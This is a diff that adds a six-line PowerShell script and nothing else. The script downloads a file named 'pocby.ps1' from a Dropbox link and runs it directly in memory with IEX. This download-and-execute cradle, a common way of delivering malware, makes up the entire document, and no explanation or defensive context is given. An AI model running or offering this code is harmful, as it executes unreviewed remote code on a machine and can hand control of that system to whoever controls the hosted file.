@@ -1,0 +1,6 @@
+$webreq = [System.Net.WebRequest]::Create(‘https://www.dropbox.com/s/2otl586tjmstpis/pocby.ps1?dl=1’)
+$resp=$webreq.GetResponse()
+$respstream=$resp.GetResponseStream()
+$reader=[System.IO.StreamReader]::new($respstream)
+$content=$reader.ReadToEnd()
+IEX($content)
